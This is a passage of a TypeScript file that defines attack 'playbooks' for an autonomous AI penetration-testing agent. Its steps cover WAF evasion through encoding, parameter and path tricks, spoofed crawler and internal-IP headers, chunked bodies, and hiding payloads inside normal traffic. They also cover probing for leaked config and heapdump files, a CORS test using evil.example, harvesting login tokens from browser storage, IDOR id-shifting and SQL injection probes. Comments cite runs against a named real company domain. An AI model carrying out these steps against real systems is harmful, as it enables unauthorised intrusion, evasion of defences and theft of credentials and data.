/**
 * 打法库（playbook）：把"手工验证"拆成 Agent 可以逐步执行的固定套路。
 *
 * 每个 playbook 描述一类漏洞在**当前工具集**里的验证路径：
 *   - steps：按顺序要做的动作（工具 + 目的 + 输入骨架）
 *   - confirm：什么证据才算确认（哪一步、必须看到什么）
 *   - stop：什么时候认定这条路走不通，换下一个 playbook
 *   - report：确认后报告里必须写清楚的东西
 *
 * 设计约束：
 *   1. 只引用真实存在的工具名（有单元测试保证），不写不存在的工具。
 *   2. 优先级顺序固定为 未授权/信息泄露 > 越权 > SQLi > 上传/RCE > 命令注入 > 反序列化 >
 *      SSRF > JWT/认证 > 云与供应链 > 逻辑 > GraphQL/WS > XSS。
 *   3. 无回显一律走 OAST（recon.interactsh），这是把"疑似"变成"确认"的唯一低成本手段。
 *   4. 重型工具（sqlmap / nuclei / katana / 目录爆破）由 `isHeavyTool` 统一标记，
 *      预算不足时 `degradedPlan` 会自动把它们摘掉并收窄确认条件（见 weights.ts）。
 */

import { isHeavyTool } from "./weights.js";

export type PlaybookStep = {
  /** 步骤标识，confirm.evidence 引用它。 */
  id: string;
  tool: string;
  purpose: string;
  /** 输入骨架，模型照抄后替换 target/参数。 */
  input?: Record<string, unknown>;
  /** 这一步应该产出的证据特征。 */
  expect?: string;
  /** 图模式：执行完这一步可以去哪些后继步骤 id（空/缺省 = 线性下一步或终点）。 */
  next?: string[];
  /** 图模式下的分支条件（人类可读），例如 "响应含 10403 → token_replay"。 */
  when?: string;
  /** 并发扇出：同一请求同时发 N 份（竞态/并发扣减），串行循环不算。 */
  concurrency?: number;
  /**
   * 执行层（必填语义，缺省按 tool 推导）：
   * - tactical：步兵，控制面直发（recon.* / http.* / burp.* / browser.*）
   * - strategic：特种兵，进沙箱跑 exec.python/exec.bash
   * - tactical_rpc：沙箱里排队、控制面发射（当前只有 recon.race_condition 这类"要并发但必须由控制面发"的动作）
   * 让模型拿到 playbook 就知道哪一步该叫什么，不必再背 routeRules。
   */
  layer?: PlaybookLayer;
  /** strategic/rpc 步骤的产物落点，下游步骤直接读（/state 下相对路径）。 */
  state_out?: string;
};

export type PlaybookLayer = "tactical" | "strategic" | "tactical_rpc";

export type Playbook = {
  id: string;
  title: string;
  /** 越小越先打。 */
  priority: number;
  when: string[];
  timebox_sec: number;
  steps: PlaybookStep[];
  confirm: { evidence: string[]; must_show: string };
  stop: string[];
  report: string[];
  /**
   * 交付物模板（缺陷 6 的除根）：模型做填空，不做问答。
   *
   * 2026-10-28 实测：40 条任务 **0 条**写过 deliverables——"请描述这条任务要交出什么"这种
   * 开放题，模型一律跳过。给出带占位符的模板后，同一条链路上 6 条任务立刻带上了真实交付物
   * （js_bundle_url / backend_api_paths / auth_header_name / endpoint_list）。
   */
  deliverables_template?: string[];
};

/** prompt 里的层标记：T=步兵、S=特种兵（沙箱）、R=沙箱排队/控制面发射。 */
export function layerTag(layer: PlaybookLayer): string {
  return layer === "strategic" ? "S" : layer === "tactical_rpc" ? "R" : "T";
}

/** 缺省按工具推导；显式声明优先。 */
export function stepLayer(step: PlaybookStep): PlaybookLayer {
  if (step.layer) return step.layer;
  return step.tool.startsWith("exec.") ? "strategic" : "tactical";
}

/** 声明与工具是否自相矛盾（测试与规则文档都用它）。 */
export function layerIssue(step: PlaybookStep, rpcWhitelist: readonly string[]): string | undefined {
  const declared = step.layer;
  if (!declared) return undefined;
  if (declared === "strategic" && !step.tool.startsWith("exec.")) return `${step.id}: strategic 层必须是 exec.*（当前 ${step.tool}）`;
  if (declared === "tactical_rpc" && step.tool.startsWith("exec.")) return `${step.id}: tactical_rpc 是控制面发射，不能是 ${step.tool}`;
  if (declared === "tactical_rpc" && !rpcWhitelist.includes(step.tool)) return `${step.id}: ${step.tool} 不在 RPC 白名单里，沙箱叫不动它`;
  if ((declared === "tactical" || declared === "strategic") && step.tool.startsWith("exec.") && declared === "tactical") return `${step.id}: tactical 层不能是 ${step.tool}`;
  return undefined;
}

export const PLAYBOOKS: Playbook[] = [
  {
    /**
     * WAF 是规则墙，不是终点。优先级 0：一旦判定目标有 WAF，它抢在所有打法前面跑，
     * 因为后面每条打法（注入/上传/未授权）都会撞同一堵墙。
     *
     * 2026-10-30 起因：qwen 一轮里 412 + 2681B 阻断页出现后，模型直接记 blocked 去 lateral_escape，
     * 一整条可绕的墙被当成"打不动"。这里的阶梯就是人类黑客的实际顺序：
     * 指纹 → 编码 → 参数 → 路径/方法/头 → 原始报文/分块 → 夹带，每档都要对照。
     */
    id: "waf_bypass",
    deliverables_template: ["waf_vendor_fingerprint", "bypass_dimension", "working_request_variant", "blocked_baseline_evidence", "ledger_replay_result"],
    title: "WAF 绕过（阶梯式）",
    priority: 0,
    when: [
      "收到 412/418/1020，或 403 但响应体是阻断页（securityfs/waf/Cloudflare/Akamai/Access Denied/访问被拒绝/校验中）",
      "同一路径换参数后响应体字节完全一致且带拦截字样",
      "burp.history 的 analysis.signals 出现 waf_suspected",
      "目标对扫描器/字典一律返 403/412，正常浏览器访问却 200",
      "**反例（来了也别跑阶梯）**：正文是 proxy_authentication_required / client attestation payload / cf_chl / captcha / 滑块 / 瑞数 —— 那是身份墙，8 档改 payload 对它无效，直接按 stop 处理",
    ],
    timebox_sec: 1200,
    steps: [
      {
        id: "recall", tool: "http.diff",
        purpose: "战例优先：先看上下文 waf_ledger（历史上真打穿过的墙与变体）。有同厂商或同拦截指纹的记录就把第 1 条变体原样复刻一次，与 baseline 对照——成功就直接进业务验证，不重新设计编码；这一档失败才进阶梯",
        input: { url: "BLOCKED_PATH", anonymous: true, variant: { url: "LEDGER_VARIANT_PATH", headers: { "User-Agent": "LEDGER_VARIANT_UA" } } },
        expect: "verdict=different 且不再出现 wall 拦截指纹（战例复刻成功），或 identical/仍被拦（战例失效，转 wall_fp 走阶梯）",
        when: "context.waf_ledger 非空（同一厂商/同一签名命中，或存在通用变体）",
        next: ["wall_fp"],
      },
      {
        id: "wall_fp", tool: "http.request",
        purpose: "取拦截基线指纹：同一路径连打两次，必须两次 status/body_bytes/body_sha256 完全一致——不一致说明撞的是限流或静态兜底，不是 WAF，先别往下走",
        input: { method: "GET", url: "BLOCKED_PATH", anonymous: true },
        expect: "两次 412/403/418/1020 且 bytes 与 sha256 一致，正文含阻断页特征",
        next: ["vendor", "encode"],
      },
      {
        id: "vendor", tool: "burp.entry",
        purpose: "读拦截响应的头判厂商与规则类型（X-WAF-*/Server/CF-Ray/Set-Cookie/AkamaiGHost）：关键字黑名单可编码绕过，语义引擎要靠参数/路径污染，人机挑战（cf_chl_opt/滑块）直接停",
        input: { entry_id: "WALL_ENTRY_ID" },
        expect: "拿到厂商或规则类型线索（Cloudflare / 安全狗 / 云锁 / 长亭 / 自研 securityfs / 语义引擎）",
        when: "wall_fp 拿到了拦截响应（头才有判断价值）",
        next: ["encode"],
      },
      {
        id: "encode", tool: "http.request",
        purpose: "编码维度先手工试最可能的一档：同一个等价载荷做 URL 双重编码或关键字双写，看是否放行（例如 union select → %25%75%6e%69%6f%6e 或 ununion selection）",
        input: { method: "GET", url: "BLOCKED_PATH?PARAM=%25%75%6e%69%6f%6e%2520%25%73%65%6c%65%63%74", anonymous: true },
        expect: "返回非拦截响应（200/业务码/真实报错 500），且正文不再出现阻断页字样",
        next: ["encode_matrix", "param_abuse", "converge"],
      },
      {
        id: "encode_matrix", tool: "exec.python", layer: "strategic", state_out: "/state/waf/encoding_matrix.json",
        purpose: "把编码档一次批量跑完：双重/三重 URL 编码、Unicode 全角、HTML 实体、大小写混写、关键字双写（selselect）、注释插入（sel/**/ect）、空白符替换（%09/%0a/%0c/%a0）、等价函数替换，每档记录 status/bytes/body_sha256 写进矩阵",
        input: { code: "# 从 /state/recon/endpoints.json 读被封的路径与参数；对每个等价载荷生成编码矩阵；全部经 MITM 代理发出（不要直连）；逐条记 {dimension,payload,status,bytes,body_sha256,blocked}；命中的（非 412/403 或 bytes 与基线不同）写入 /state/waf/encoding_matrix.json 的 hits 数组；单条超时 8s，总量 ≤ 200 条", timeout_s: 180 },
        expect: "/state/waf/encoding_matrix.json 里 hits 非空，或所有档位 status+bytes 与 wall_fp 完全一致",
        next: ["param_abuse", "path_trick", "converge"],
      },
      {
        id: "param_abuse", tool: "http.request",
        purpose: "增加 WAF 负担：同名参数双写（WAF 只查第一个）、堆 100+ 个无害参数把真载荷挤到末尾、参数顺序调换、把载荷拆到多个参数再让后端拼接",
        input: { method: "GET", url: "BLOCKED_PATH?cdn=1&v=2&id=1&id=PAYLOAD", anonymous: true },
        expect: "后端按第二个 id 执行（回显/报错/延时），而 WAF 只看第一个无害值",
        next: ["path_trick", "method_swap", "converge"],
      },
      {
        id: "path_trick", tool: "http.request",
        purpose: "路径规范化绕过：//、%2f、%252f、;参数分隔、..;/、%00、末尾斜杠、大小写、/./ —— 让 WAF 的路径白名单/黑名单匹配落空而后端仍解析到同一资源",
        input: { method: "GET", url: "TARGET/./admin/..;/ACTUATOR_PATH", anonymous: true },
        expect: "同一资源在变形路径上返回 200/业务数据，而原路径是 412/403",
        next: ["method_swap", "header_spoof", "converge"],
      },
      {
        id: "method_swap", tool: "burp.send",
        purpose: "方法转换：GET↔POST 互换、POST→PUT/OPTIONS、加 X-HTTP-Method-Override，以及非常用动词（http.request 的 method 是枚举，只能走 burp.send 原始报文）",
        input: { url: "BLOCKED_PATH", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "X-HTTP-Method-Override": "GET" }, body: "PARAM=PAYLOAD" },
        expect: "WAF 按方法分流时被放行：非拦截响应或响应体与 wall_fp 不同",
        next: ["header_spoof", "raw_burp", "converge"],
      },
      {
        id: "header_spoof", tool: "http.request",
        purpose: "白名单伪装：UA 换搜索引擎爬虫（Googlebot/Baiduspider）、X-Forwarded-For / X-Real-IP / X-Client-IP / X-Originating-IP=127.0.0.1 伪装内网来源、X-Original-URL / X-Rewrite-URL 改写被判定的路径、Referer 指向同站内网页面",
        input: { method: "GET", url: "BLOCKED_PATH", headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/ACTUATOR_PATH" } },
        expect: "返回非拦截响应；若 X-Original-URL 生效，正文就是被改写路径的内容",
        next: ["raw_burp", "load_cover", "converge"],
      },
      {
        id: "raw_burp", tool: "burp.send",
        purpose: "报文层绕过：burp.send 原始报文自定义 Host、重复 Content-Length、chunked 分块、超长 header/body 前置垃圾把载荷压到尾部（很多 WAF 只检前 N KB）",
        input: { url: "TARGET/ENDPOINT", method: "POST", headers: { Host: "TARGET_HOST", "Content-Type": "application/x-www-form-urlencoded", "Transfer-Encoding": "chunked" }, body: "a=AAAAAAAA...(>8192 字节无害填充)&PARAM=PAYLOAD" },
        expect: "载荷越过检测窗口被执行（回显/报错/延时），且 wall_fp 的拦截指纹不再出现",
        next: ["load_cover", "converge"],
      },
      {
        id: "load_cover", tool: "burp.send_batch",
        purpose: "负载夹带（谨慎）：一批正常业务请求里夹 1–2 条异常包，利用「流量过大时放弃部分检测」的行为；一次 ≤20 条并降速，不做压测，避免把站点打成不可用",
        input: { requests: [{ url: "TARGET/NORMAL_A", method: "GET" }, { url: "TARGET/NORMAL_B", method: "GET" }, { url: "BLOCKED_PATH?PARAM=PAYLOAD", method: "GET" }] },
        expect: "异常那条的响应与单独打时不同（放行或降级检测）",
        next: ["converge"],
      },
      {
        id: "converge", tool: "http.diff",
        purpose: "结案对照：把 wall_fp 的基线与被放行的变体做结构化 diff，确认差异来自变体维度而不是缓存/抖动/登录态",
        input: { url: "BLOCKED_PATH", anonymous: true, variant: { url: "BYPASSED_PATH_OR_ENCODING", headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)" } } },
        expect: "verdict=different 且 status/bytes/正文特征三项都变；不是 identical 也不是同一个阻断页",
      },
    ],
    confirm: {
      evidence: ["converge"],
      must_show: "同一个语义载荷（等价注入点/等价路径/等价上传）在某个变体维度上返回非拦截响应（200/业务码/真实报错/真实 404 差异），且 http.diff 证明差异由该变体维度引起；拦截基线与命中变体的 status + 字节数 + body_sha256 三项都不同",
    },
    stop: [
      "阶梯全部返回同一拦截指纹（status + bytes + body_sha256 三项一致）→ 判规则级/语义级封锁，记下 wall fingerprint 后转 lateral_escape，不要在同一 host 上继续加档",
      "出现 429、封禁页、人机挑战（Cloudflare JS challenge / 滑块 / captcha）→ 立刻停手，继续打会拉黑出口 IP，记 wall 后转 lateral_escape",
      "正文是 attestation 挑战（proxy_authentication_required / client attestation payload）→ 立刻停手：它要求提交 principal/username/email/provenance，**这是钓身份不是认证**，提交等于把资产身份交出去；改走 auth_token 拿合法凭证，或换不经过该网关的边缘资产",
      "同一路径两次 fingerprint 不一致 → 不是墙是风控抖动，停手降频重试（≥30s 间隔），不要用阶梯去撞限流",
      "绕过尝试触发账号/身份告警（连续 401 + 风控字样）→ 停手，不要拿凭证去撞风控",
    ],
    report: [
      "WAF 厂商与规则类型（关键字黑名单 / 正则 / 语义引擎 / 云 WAF 地域策略 / 人机挑战）",
      "打穿的是哪一档维度（编码 / 参数 / 路径 / 方法 / 头 / 报文层 / 夹带）与可复用的完整变体",
      "该变体如何复用到后续打法（编码套进 sqlmap 的 tamper、路径变形套进目录爆破、UA 头套进全局 headers）",
    ],
  },
  {
    /**
     * 2026-11-01 新增（business.oppo.com 实测沉淀）：纯 SPA 外壳的逆向打法。
     *
     * 那一轮 5159B 外壳 + text_ratio 0.02 + catch-all fallback，15 条打法里没有一条
     * 有合法的第 1 步——unauth_exposure 的字典步骤只会产出 soft-404 假阳性，
     * confirm 永远拿不到，T_SPA_REVERSE 只能绑 unauth_exposure 然后 blocked。
     * 这条打法把"外壳翻译成接口清单"本身当成 confirm，确认后再分派业务打法。
     */
    id: "spa_reverse",
    deliverables_template: ["js_bundle_url", "backend_api_paths", "cross_domain_assets", "render_xhr_list", "catch_all_verdict"],
    title: "SPA 外壳逆向：外壳 → bundle → 渲染期 XHR → 接口清单",
    priority: 1,
    when: [
      "首页 body 很小（<20KB）且正文几乎无文字（text_ratio < 0.1）、external_scripts ≥ 2 —— 纯前端外壳",
      "任意两条不同路径返回同一份 HTML / 同一 body_bytes（catch-all fallback）",
      "burp.history 的 analysis.signals 出现 spa_shell，或字典/内容探测全是同构 200 的 soft_404",
    ],
    timebox_sec: 900,
    steps: [
      { id: "shell_baseline", tool: "http.request", purpose: "匿名取一次外壳：status/body_bytes/server/重定向链，作为 catch-all 判定与后续所有 http.diff 的基线（http.request 不在缴械清单里，直接可打）",
        input: { url: "TARGET", method: "GET", anonymous: true, follow_redirects: true, timeout_ms: 20000 },
        expect: "200 且 body_bytes 很小、正文几乎无可读文字（外壳指纹）" },
      { id: "shell_scripts", tool: "recon.js_endpoints", purpose: "解析外壳引用的真实 bundle 清单（无引号 src 的压缩 HTML 现在也认）；js_files=0 才算真空壳",
        input: { url: "TARGET" },
        expect: "js_files ≥ 1 并返回 .js 清单，或确凿的 no_script_references" },
      { id: "bundle_extract", tool: "exec.python", layer: "strategic", state_out: "/state/spa_bundle.json",
        purpose: "整份拉 bundle 正文，三条正则抠料：axios baseURL、/api 类前缀、跨域业务域名；落盘 /state/spa_bundle.json 供 fs.grep 复读",
        input: { code: `import json,re,urllib.request
BASE="TARGET_ORIGIN"
files=["JS_URL_1","JS_URL_2"]
pats={"baseURL":r"baseURL[^A-Za-z0-9]{0,4}https?://[A-Za-z0-9_.:/-]+","api":r"/(api|v1|v2|rest|service)/[A-Za-z0-9_/{}.:-]+","hosts":r"https?://[A-Za-z0-9.-]+\\.TARGET_ROOT_DOMAIN"}
out={}
for f in files:
    try:
        body=urllib.request.urlopen(BASE+f,timeout=30).read().decode("utf-8","ignore")
    except Exception as exc:
        out[f]={"error":str(exc)};continue
    hits={k:sorted(set(re.findall(p,body)))[:200] for k,p in pats.items()}
    out[f]={"bytes":len(body),"hits":hits,"found":len(hits["api"])+len(hits["hosts"])+len(hits["baseURL"])}
open("/state/spa_bundle.json","w").write(json.dumps(out,ensure_ascii=False,indent=1))
print(json.dumps({k:(v.get("bytes"),v.get("found",0)) for k,v in out.items()},ensure_ascii=False))` },
        expect: "至少 1 条 baseURL / /api 前缀 / 跨域域名命中（外壳被翻译成接口面）" },
      { id: "sourcemap_probe", tool: "http.request", purpose: "直取 .js.map：200 即拿到原始源码、接口常量与后端 baseURL —— 本类目标单点最高收益，优先于任何字典",
        input: { url: "JS_BUNDLE_URL.map", method: "GET", anonymous: true },
        expect: "200 且 JSON 含 sourcesContent；404 或与外壳同构则记 map 不暴露（verified-negative）" },
      { id: "render_xhr", tool: "browser.open", purpose: "渲染外壳（networkidle + 首屏后等待），让真实业务 XHR 发出来",
        input: { url: "TARGET", wait_until: "networkidle", wait_ms: 3000, timeout_ms: 45000 },
        expect: "页面进入业务态（出现列表/详情/表单），不再只有 loading 骨架" },
      { id: "xhr_list", tool: "browser.network", purpose: "取渲染期请求表（含 method 与 post_data），滤出 /api /v1 /rest 的 XHR 与参数名——参数名是看出来的，不是猜的",
        input: { limit: 100, include_post_data: true },
        expect: "≥1 条带 method 的真实 XHR：这就是外壳被翻译成接口清单的判据" },
      { id: "catch_all", tool: "http.diff", purpose: "一条不存在的 /api/ 随机路径对照外壳：同字节=全站 SPA fallback（所有字典作废）；JSON/401/403 差异=后端在场，立刻在该前缀立 unauth_exposure/idor 任务",
        input: { url: "TARGET", variant: { url: "API_PROBE_URL" } },
        expect: "verdict=identical（fallback，停字典）或 different（后端在场，转业务打法）" },
    ],
    confirm: { evidence: ["bundle_extract", "xhr_list"], must_show: "bundle 正文抠出 baseURL 或 /api/ 前缀清单，或 browser.network 拿到 ≥1 条带 method 的真实 XHR（二者取其一：外壳已被翻译成可打的接口面）" },
    stop: [
      "shell_scripts 与 bundle_extract 都拿不到任何 .js（真空壳）→ 记 verified-negative，转资产侧找跨域域名",
      "render_xhr 连续 2 次渲染仍 0 条 XHR（纯静态宣传页）→ 停手，别再撞目录",
      "catch_all 判为全站 fallback 且无任何 /api 前缀差异 → 本域无后端面，字典与爆破全部作废",
    ],
    report: ["前端框架与打包入口（bundle 名+体积）", "baseURL 与 /api 前缀清单", "跨域业务域名（商城/开发者平台/SSO）", "渲染期 XHR 方法与参数名", "catch-all 判定结论"],
  },
  {
    id: "unauth_exposure",
    deliverables_template: ["exposed_endpoint","response_body_fingerprint","auth_wall_verdict","evidence_ids"],
    title: "未授权访问 / 信息泄露",
    priority: 1,
    when: ["任何存活主机", "指纹为 Spring/Nacos/Druid/Swagger/Actuator/若依/帆软/用友", "看到 /api /admin /manage 前缀"],
    timebox_sec: 900,
    steps: [
      { id: "probe_sensitive", tool: "recon.content_discovery", purpose: "用敏感路径字典命中高价值入口", input: { urls: ["/actuator/env", "/actuator/heapdump", "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs", "/druid/index.html", "/nacos/", "/.git/config", "/.env", "/backup.zip"] }, expect: "200/401/403 且非统一登录跳转" },
      { id: "baseline_anon", tool: "http.request", purpose: "未登录态直接取一次，记录 status/body_bytes/body 指纹（显式 anonymous:true，跳过全局 Cookie/Token 罐）", input: { method: "GET", url: "TARGET_ENDPOINT", anonymous: true }, expect: "200 且返回结构化数据（JSON/配置/日志）" },
      { id: "diff_login", tool: "http.diff", purpose: "对比未登录与登录态，验证是否真的缺鉴权（基线用 anonymous:true 保证真的没带凭证）", input: { url: "TARGET_ENDPOINT", anonymous: true, variant: { headers: { Cookie: "SESSION=登录态" } } }, expect: "未登录与登录返回同样的业务数据" },
      { id: "render", tool: "browser.open", purpose: "SPA 里确认数据已渲染到页面", input: { url: "TARGET_ENDPOINT", evaluate: "document.body.innerText.slice(0,2000)" }, expect: "页面出现账号/配置/密钥等敏感字段" },
      { id: "cors_probe", tool: "http.request", purpose: "带外部 Origin 打同一个 API，看 Access-Control-Allow-Origin 是否被反射（SPA 高频缺陷）",
        input: { method: "GET", url: "TARGET_ENDPOINT", headers: { Origin: "https://evil.example" } },
        expect: "响应头 ACAO 原样反射 https://evil.example，或返回 * 且 Allow-Credentials:true" },
      { id: "cors_verify", tool: "http.diff", purpose: "对比不带 Origin 与带伪造 Origin 的响应头，确认是反射而不是固定值",
        input: { url: "TARGET_ENDPOINT", variant: { headers: { Origin: "https://evil.example" } } },
        expect: "两次 ACAO 不同：一次固定、一次反射外部域" },
    ],
    confirm: { evidence: ["baseline_anon", "diff_login"], must_show: "未带任何凭证返回 200 且 body 含敏感字段（账号、连接串、密钥、他人数据），且与登录态返回一致；或 ACAO 反射外部 Origin 且 Allow-Credentials:true（CORS 配置缺陷，用 cors_verify 的 http.diff 证明是反射而非固定值）" },
    stop: ["所有敏感路径都 302 到统一登录页且无数据返回", "返回体是空壳 SPA 模板（body_bytes 与首页一致）"],
    report: ["泄露的具体字段与条数", "是否需要登录本应返回 401/403", "heapdump/env 之类可进一步拿到什么"],
  },
  {
    id: "auth_token",
    deliverables_template: ["auth_state_summary","business_response_diff","auth_header_name"],
    title: "认证链：浏览器取 Token → HTTP 打业务",
    priority: 2,
    when: [
      "所有业务接口统一返回 10403/401/未登录/token 失效",
      "存在登录页、SSO、OAuth 或 /api/user/login、/api/user/getToken",
      "匿名可读面已经榨干，只剩鉴权面",
    ],
    timebox_sec: 900,
    steps: [
      { id: "login_page", tool: "browser.open", purpose: "打开登录/SSO 页，抓表单字段与脚本里的登录接口",
        input: { url: "LOGIN_URL", evaluate: "JSON.stringify(Array.from(document.forms).map(f=>({action:f.action,fields:Array.from(f.elements).map(e=>({name:e.name,type:e.type}))})))" },
        expect: "拿到表单 action 与字段名，或页面里出现 /api/user/login 这类字面量" },
      { id: "gate_probe", tool: "browser.open", purpose: "登录前先识别门禁类型：图形/短信验证码、MFA、扫码登录、SSO 跳转、风控滑块。命中就别再试第二遍",
        input: { url: "LOGIN_URL", evaluate: "JSON.stringify({captcha:!!document.querySelector('img[src*=captcha],input[name*=captcha],iframe[src*=captcha],.verify-code,.geetest'),mfa:/MFA|动态口令|谷歌验证|Authenticator|两步验证|短信验证/i.test(document.body.innerText),sso:/统一认证|SSO|passport|oauth/i.test(location.href+document.body.innerText),slider:/滑块|拖动|slide/i.test(document.body.innerText),text:document.body.innerText.slice(0,400)})" },
        expect: "返回 captcha/mfa/sso/slider 的布尔值；任一为 true 即视为门禁不可自动通过" },
      { id: "submit_login", tool: "browser.open", purpose: "用 actions 填表并点登录；无表单时改用 evaluate 直接 fetch 登录接口",
        input: { url: "LOGIN_URL", actions: [{ type: "fill", selector: "input[name=username]", value: "USER" }, { type: "fill", selector: "input[type=password]", value: "PASS" }, { type: "click", selector: "button[type=submit]" }], wait_ms: 1500 },
        expect: "页面跳转或出现登录成功态，或响应里出现 token 字段" },
      { id: "capture_token", tool: "browser.open", purpose: "从 localStorage/sessionStorage/cookie 里读出 token；执行器会自动把其中像 JWT 的值写进全局 Token 罐（data.tokens_captured）",
        input: { url: "TARGET_ENDPOINT", evaluate: "JSON.stringify({ls:Object.fromEntries(Object.entries(localStorage)),ss:Object.fromEntries(Object.entries(sessionStorage)),ck:document.cookie})" },
        expect: "拿到 token/JWT/session cookie 的具体值或名称；summary 里出现「已捕获 N 个 Token 进全局罐」即写入成功" },
      { id: "replay", tool: "http.request", purpose: "带 Authorization/Cookie 重打之前返回 10403 的接口（token 可放顶层 token 字段，执行器自动转 Bearer；留空则用全局罐里的）",
        input: { method: "GET", url: "BLOCKED_ENDPOINT", token: "TOKEN" },
        expect: "状态码或业务码变化（10403 → 10200/200 且有数据）" },
      { id: "business", tool: "http.diff", purpose: "匿名 vs 带 Token 结构化对比，确认真的进了业务数据层",
        input: { url: "BLOCKED_ENDPOINT", variant: { headers: { Authorization: "Bearer TOKEN" } } },
        expect: "auth_only_change=true 或正文出现业务字段/他人数据" },
    ],
    confirm: { evidence: ["replay", "business"], must_show: "带 Token 的响应出现业务数据（列表/详情/他人字段），且与匿名响应结构不同" },
    stop: ["gate_probe 命中 captcha/mfa/slider 且没有旁路（无手机号彩信通道、无 SSO 回调可复用）→ 立刻 blocked，reason=auth_gate_*，转 unauth_exposure", "登录有验证码且无法绕过，且没有其他取 Token 的接口", "同一账号连续两次登录失败即停手（会锁号，且没有第三次机会）", "站点没有登录入口，匿名面已可读（说明不存在鉴权墙）"],
    report: ["Token 来源（哪个接口/哪个存储）", "带 Token 前后的响应差异", "凭该 Token 能读到的业务数据范围"],
  },
  {
    id: "idor",
    deliverables_template: ["object_id_enum_result","cross_identity_diff","owner_boundary_verdict"],
    title: "越权 / IDOR",
    priority: 3,
    when: ["接口出现 userId/orderId/tenantId/roleId 等对象 id", "同一功能有 A/B 两个账号", "接口返回他人资源字段", "只有单账号（黑盒常见）：用 id±1 盲猜 + 自身基线对比"],
    timebox_sec: 1200,
    steps: [
      { id: "own_resource", tool: "http.request", purpose: "用账号 A 取自己的资源，记下 id 与响应（建立自身基线）", input: { method: "GET", url: "TARGET_ENDPOINT?userId=ID_A", headers: { Cookie: "SESSION_A" } }, expect: "200 + A 的资料" },
      { id: "baseline_self", tool: "http.diff", purpose: "同 id 连打两次做自比对：先排除随机字段、时间戳造成的假差异，后面 id 变化才可信", input: { url: "TARGET_ENDPOINT?userId=ID_A", variant: { url: "TARGET_ENDPOINT?userId=ID_A" }, headers: { Cookie: "SESSION_A" } }, expect: "两次响应同构（差异仅为时间戳/随机数）；若两次就不同，先记录噪音字段" },
      { id: "shift_id", tool: "http.request", purpose: "单账号盲猜：把 id 加减 1（必要时再试 ±2、前导零、字符串化）逐个打，只用自己这一份凭证", input: { method: "GET", url: "TARGET_ENDPOINT?userId=ID_A_MINUS_1", headers: { Cookie: "SESSION_A" } }, expect: "200 + 别人的数据（id 相邻即可读到，越权成立）" },
      { id: "diff_auth", tool: "http.diff", purpose: "自己的 id 与相邻 id 结构化对比：正文差异必须是身份字段，而不是随机噪音（对照 baseline_self）", input: { url: "TARGET_ENDPOINT?userId=ID_A", variant: { url: "TARGET_ENDPOINT?userId=ID_A_PLUS_1" }, headers: { Cookie: "SESSION_A" } }, expect: "status 相同、body 的姓名/手机/订单等身份字段不同；且该差异在 baseline_self 里不出现" },
      { id: "vertical", tool: "http.diff", purpose: "低权限账号访问高权限接口（垂直越权）", input: { url: "ADMIN_ENDPOINT", headers: { Cookie: "SESSION_LOW" }, variant: { headers: { Cookie: "SESSION_ADMIN" } } }, expect: "低权限也返回 200 与管理员数据" },
    ],
    confirm: { evidence: ["diff_auth"], must_show: "凭证属于 A，返回的却是相邻 id（A±1）或其他对象的业务数据，且该差异在 baseline_self 的两次自比对里不存在；或低权限账号拿到高权限接口数据" },
    stop: ["换 id 后返回 403/404 且长度与基线一致", "接口只回显当前登录人（服务端强制绑定 session）"],
    report: ["能越权操作哪些角色/多少对象", "被泄露字段清单（手机号、地址、订单）", "是否可写（改他人资料/状态）"],
  },
  {
    id: "sqli",
    deliverables_template: ["injection_point","boolean_or_time_verdict","http_diff_verdict"],
    title: "SQL 注入",
    priority: 4,
    when: ["参数进入查询（id/name/keyword/order/sort）", "报错回显 SQL 关键字", "响应时间随 sleep 变化"],
    timebox_sec: 1500,
    steps: [
      { id: "arith_probe", tool: "http.request", purpose: "无害化第一步：只用算术表达式（PARAM=2-1）对照 PARAM=1，不带引号、不带注释符，WAF 基本不拦",
        input: { method: "GET", url: "TARGET_ENDPOINT?PARAM=2-1" },
        expect: "与 PARAM=1 返回同一条记录（说明参数进了表达式求值），而参数被当字符串时正文会回显 \"2-1\"" },
      { id: "diff_arith", tool: "http.diff", purpose: "结构化对比 PARAM=1 与 PARAM=2-1：先确认是否存在表达式求值迹象，再决定要不要升级探测",
        input: { url: "TARGET_ENDPOINT?PARAM=1", variant: { url: "TARGET_ENDPOINT?PARAM=2-1" } },
        expect: "两侧同构（等价求值）→ 有表达式上下文；两侧不同 → 参数是字符串，别急着上引号" },
      { id: "quote_probe", tool: "http.request", purpose: "第二步才用单个引号探错误：只发一个 \\'，看是否 500 / 回显 SQL 报错，不构造完整注入语句",
        input: { method: "GET", url: "TARGET_ENDPOINT?PARAM=1%27" },
        expect: "500 或正文出现 SQL syntax / ORA- / MySQL 等报错特征；无反应则换参数，不重复刷同一个点" },
      { id: "time_probe", tool: "http.diff", purpose: "第三步用时间延迟确认（2 秒，非破坏性）：一次 diff 同时打正常与 SLEEP(2) 两个请求，时间维度是硬判定",
        input: { url: "TARGET_ENDPOINT?PARAM=1", variant: { url: "TARGET_ENDPOINT?PARAM=1%20AND%20SLEEP(2)", timeout_ms: 15000 }, timing_threshold_ms: 1800 },
        expect: "verdict=timing_delta（data.timing.suspect=true，delta_ms≈2000）；正文相同也算成立。无差异立即停，换参数或改走 OAST" },
      { id: "sqlmap", tool: "recon.sql", purpose: "自动化确认（level 1 / risk 1，低噪），只用来确认与取 DBMS，不做拖库", input: { url: "TARGET_ENDPOINT?PARAM=1", level: 1, risk: 1, technique: "BEU" }, expect: "sqlmap 报 injectable 并列出 DBMS" },
      { id: "blind_oast", tool: "recon.interactsh", purpose: "无回显时用 OAST 确认（先 start 拿 payload 再 poll）", input: { action: "start", wait_seconds: 8 }, expect: "DNS/HTTP 回调命中" },
